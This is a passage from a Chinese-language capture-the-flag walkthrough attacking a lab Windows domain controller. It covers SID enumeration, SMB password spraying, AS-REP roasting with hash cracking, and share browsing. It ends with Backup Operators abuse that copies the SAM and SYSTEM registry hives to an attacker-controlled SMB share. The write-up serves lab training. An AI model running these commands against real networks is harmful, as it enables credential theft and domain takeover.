        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share </code></pre>
<p>访问了一下几个开放的目录，并没有什么东西。IPC$开放，可以尝试lookupsid.</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> lookupsid.py charlie@192.168.56.126   
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Brute forcing SIDs at <span class="token number">192.168</span>.56.126
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StringBinding ncacn_np:192.168.56.126<span class="token punctuation">[</span><span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Domain SID is: S-1-5-21-2986980474-46765180-2505414164
<span class="token number">498</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">500</span>: SOUPEDECODE<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">501</span>: SOUPEDECODE<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">502</span>: SOUPEDECODE<span class="token punctuation">\</span>krbtgt <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">512</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">513</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">514</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Guests <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">515</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Computers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">516</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">517</span>: SOUPEDECODE<span class="token punctuation">\</span>Cert Publishers <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">518</span>: SOUPEDECODE<span class="token punctuation">\</span>Schema Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">519</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">520</span>: SOUPEDECODE<span class="token punctuation">\</span>Group Policy Creator Owners <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">521</span>: SOUPEDECODE<span class="token punctuation">\</span>Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">522</span>: SOUPEDECODE<span class="token punctuation">\</span>Cloneable Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.</code></pre>
<p>把用户名导出来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> user.txt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print substr($2, 13)&#125;'</span> <span class="token operator">></span> username.txt</code></pre>
<p>再去爆破一下smb</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Success: <span class="token string">'.\charlie:charlie'</span></code></pre>
<p>没收获。</p>
<h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h2><p>先尝试kerberoasting攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">192.168</span>.56.126 soupedecode.local/charlie                             
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
No entries found<span class="token operator">!</span></code></pre>
<p>尝试AS-REP Rroasting攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> GetNPUsers.py <span class="token parameter variable">-usersfile</span> username.txt -no-pass -dc-ip <span class="token number">192.168</span>.56.126 soupedecode.local/
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User Administrator doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User DC01$ doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User bmark0 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User otara1 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User kleo2 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User eyara3 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User pquinn4 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jharper5 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User bxenia6 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User gmona7 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User oaaron8 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User pleo9 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User evictor10 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User wreed11 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User bgavin12 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ndelia13 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User akevin14 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User kxenia15 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User ycody16 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User qnora17 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User dyvonne18 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User qxenia19 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User rreed20 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User icody21 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User ftom22 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ijake23 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User rpenny24 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jiris25 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User colivia26 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User pyvonne27 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User zfrank28 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ybob317 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User file_svc doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User charlie doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User qethan32 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User khenry33 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User sjudy34 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User rrachel35 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User caiden36 doesn<span class="token string">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User xbella37 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> User smark38 doesn't have UF_DONT_REQUIRE_PREAUTH <span class="token builtin class-name">set</span>
<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$zximena448</span>@SOUPEDECODE.LOCAL:e5697462f07ce86dc5706de972c92a93<span class="token variable">$11bf6eae5807576755b8287618864bd5b7129080c466b93eac9363c08dbb3a3e3735a9ce5427b0be525f0f9cdb78fb40ad1b377762f9b9c461c6656a60014e235d71154d6ac041899b424f8b8a206b0be3e8a2c5947eb7cb5f6ae2da6d7c853bc7ac3e37f7c0bab1eda9acbe06d4a2cce00cf97cc7656e2f01e254e01df04fc5275a9fb3a05f91529bf2a8b5177775595248d025c26f05589261a6b038269128c72a1ad699437c9c1c545b1e042db0659a789cd4eca954939eb80da0268f2962027783dd90ccd80d1a1eb4c07772fad5537f3020f3eee5c18e9f2be7d38d32b1ac40066ec988ba72f10adfd378ccec5b5f2e4e0fbe71</span></code></pre>
<p>拿到了<code>zximena448</code>用户的AS-REP哈希,破解一下试试</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>krb5asrep, Kerberos <span class="token number">5</span> AS-REP etype <span class="token number">17</span>/18/23 <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
internet         <span class="token punctuation">(</span><span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$zximena448</span>@SOUPEDECODE.LOCAL<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-16 <span class="token number">15</span>:16<span class="token punctuation">)</span> <span class="token number">100</span>.0g/s 33600p/s 33600c/s 33600C/s smokey<span class="token punctuation">..</span>olivia
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>密码是<code>internet</code><br>smb看一下共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-u</span> zximena448 <span class="token parameter variable">-p</span> internet <span class="token parameter variable">--shares</span> 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows Server <span class="token number">2022</span> Build <span class="token number">20348</span> x64 <span class="token punctuation">(</span>name:DC01<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SOUPEDECODE.LOCAL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>zximena448:internet 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerated shares
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             Share           Permissions     Remark
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             -----           -----------     ------
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             ADMIN$          READ            Remote Admin
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             C$              READ,WRITE      Default share
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             IPC$            READ            Remote IPC
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             NETLOGON        READ            Logon server share 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             SYSVOL          READ            Logon server share </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.126<span class="token punctuation">\</span><span class="token punctuation">\</span>c$ <span class="token parameter variable">-U</span> zximena448        
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>zximena448<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span> 
  <span class="token variable">$WinREAgent</span>                        DH        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:19:51 <span class="token number">2024</span>
  Documents and Settings          DHSrn        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  DumpStack.log.tmp                 AHS    <span class="token number">12288</span>  Wed Jul <span class="token number">17</span> <span class="token number">10</span>:02:30 <span class="token number">2024</span>
  pagefile.sys                      AHS <span class="token number">1476395008</span>  Wed Jul <span class="token number">17</span> <span class="token number">10</span>:02:30 <span class="token number">2024</span>
  PerfLogs                            D        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:15:05 <span class="token number">2021</span>
  Program Files                      DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:31 <span class="token number">2024</span>
  Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>                 D        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">17</span>:34:13 <span class="token number">2021</span>
  ProgramData                       DHn        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Recovery                         DHSn        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  System Volume Information         DHS        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:02:21 <span class="token number">2024</span>
  Users                              DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 02:31:08 <span class="token number">2024</span>
  Windows                             D        <span class="token number">0</span>  Wed Jul <span class="token number">17</span> 07:11:18 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10926157</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> Users
smb: <span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 02:31:08 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Wed Jul <span class="token number">17</span> <span class="token number">10</span>:04:40 <span class="token number">2024</span>
  Administrator                       D        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:56:40 <span class="token number">2024</span>
  All Users                       DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  Default                           DHR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Default User                    DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  desktop.ini                       AHS      <span class="token number">174</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:14:03 <span class="token number">2021</span>
  Public                             DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:32 <span class="token number">2024</span>
  zximena448                          D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 02:30:22 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10926157</span> blocks available
smb: <span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> zximena448
smb: <span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zximena448<span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> Desktop
smb: <span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zximena448<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 02:31:24 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 02:30:22 <span class="token number">2024</span>
  desktop.ini                       AHS      <span class="token number">282</span>  Tue Jun <span class="token number">18</span> 02:30:22 <span class="token number">2024</span>
  user.txt                            A       <span class="token number">33</span>  Thu Jun <span class="token number">13</span> 04:01:30 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10926137</span> blocks available
smb: <span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zximena448<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token operator">></span> get user.txt
getting <span class="token function">file</span> <span class="token punctuation">\</span>Users<span class="token punctuation">\</span>zximena448<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>user.txt of size <span class="token number">33</span> as user.txt <span class="token punctuation">(</span><span class="token number">3.2</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">3.2</span> KiloBytes/sec<span class="token punctuation">)</span></code></pre>
<p>拿到user flag了。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先ldap搜一手信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ldapsearch <span class="token parameter variable">-x</span> <span class="token parameter variable">-H</span> ldap://192.168.56.126 <span class="token parameter variable">-D</span> <span class="token string">"zximena448@soupedecode.local"</span> <span class="token parameter variable">-w</span> internet <span class="token parameter variable">-b</span> <span class="token string">"dc=soupedecode,dc=local"</span> <span class="token string">"(objectClass=*)"</span> <span class="token operator">|</span> <span class="token function">grep</span> memberOf
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Group Policy Creator Owners,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Domain Admins,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Enterprise Admins,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema Admins,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Administrators,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Guests,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Pre-Windows <span class="token number">2000</span> Compatible Access,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>L
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Users,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Administrators,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Administrators,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Users,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Guests,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>SOUPEDECODE,DC
memberOf: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Backup Operators,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>SOUPEDECODE,DC<span class="token operator">=</span>LOCAL</code></pre>
<p>可以看到这个用户是个备份操作员,可以利用这一点拿到注册表文件<br>先起个smb服务方便把备份文件传过来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> impacket-smbserver <span class="token parameter variable">-smb2support</span> <span class="token string">"share"</span> <span class="token builtin class-name">.</span>                                                             

Impacket v0.12.0.dev1 - Copyright <span class="token number">2023</span> Fortra

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Config <span class="token function">file</span> parsed
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Callback added <span class="token keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Callback added <span class="token keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Config <span class="token function">file</span> parsed
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Config <span class="token function">file</span> parsed
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Config <span class="token function">file</span> parsed</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> impacket-reg <span class="token string">"soupedecode.local"</span>/<span class="token string">"zximena448"</span><span class="token builtin class-name">:</span><span class="token string">"internet"</span>@<span class="token string">"192.168.56.126"</span> backup <span class="token parameter variable">-o</span> <span class="token string">'\\192.168.56.104\share'</span>

Impacket v0.12.0.dev1 - Copyright <span class="token number">2023</span> Fortra

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Cannot check RemoteRegistry status. Triggering start trough named pipe<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved HKLM<span class="token punctuation">\</span>SAM to <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.104<span class="token punctuation">\</span>share<span class="token punctuation">\</span>SAM.save
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved HKLM<span class="token punctuation">\</span>SYSTEM to <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.104<span class="token punctuation">\</span>share<span class="token punctuation">\</span>SYSTEM.save
